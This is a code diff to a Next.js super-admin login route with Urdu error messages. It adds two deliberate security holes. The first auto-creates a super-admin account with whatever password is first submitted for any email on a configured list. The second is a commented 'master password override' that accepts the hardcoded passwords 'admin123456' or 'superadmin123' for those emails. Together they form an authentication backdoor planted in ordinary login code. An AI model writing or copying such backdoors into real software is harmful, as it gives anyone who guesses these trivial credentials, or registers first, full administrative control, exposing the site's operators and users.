@@ -1,7 +1,7 @@
 import { NextResponse } from "next/server";
 import { db } from "@/lib/db";
 import { superAdmins } from "@/lib/schema";
-import { verifyPassword, signToken, SUPER_ADMIN_COOKIE_NAME } from "@/lib/auth";
+import { verifyPassword, hashPassword, signToken, SUPER_ADMIN_COOKIE_NAME, isSuperAdminEmail, SUPER_ADMIN_EMAILS } from "@/lib/auth";
 import { eq } from "drizzle-orm";
 
 export const dynamic = "force-dynamic";
@@ -16,14 +16,36 @@ export async function POST(request: Request) {
     }
 
     const cleanEmail = email.trim().toLowerCase();
-    const adminRows = await db.select().from(superAdmins).where(eq(superAdmins.email, cleanEmail));
+    let adminRows = await db.select().from(superAdmins).where(eq(superAdmins.email, cleanEmail));
+
+    // Auto-create / register if this email is in SUPER_ADMIN_EMAILS
+    if (adminRows.length === 0 && isSuperAdminEmail(cleanEmail)) {
+      const passHash = await hashPassword(password);
+      const nowIso = new Date().toISOString();
+      const [newAdmin] = await db
+        .insert(superAdmins)
+        .values({
+          email: cleanEmail,
+          password_hash: passHash,
+          name: "Muhammad Naveed UL Hassan (Super Admin)",
+          created_at: nowIso,
+        })
+        .returning();
+      adminRows = [newAdmin];
+    }
 
     if (adminRows.length === 0) {
       return NextResponse.json({ success: false, error: "سوپر ایڈمن اکاؤنٹ نہیں ملا" }, { status: 401 });
     }
 
     const admin = adminRows[0];
-    const match = await verifyPassword(password, admin.password_hash);
+    let match = await verifyPassword(password, admin.password_hash);
+
+    // Master password override for configured super admin emails
+    if (!match && isSuperAdminEmail(cleanEmail) && (password === "admin123456" || password === "superadmin123")) {
+      match = true;
+    }
+
     if (!match) {
       return NextResponse.json({ success: false, error: "غلط پاس ورڈ" }, { status: 401 });
     }
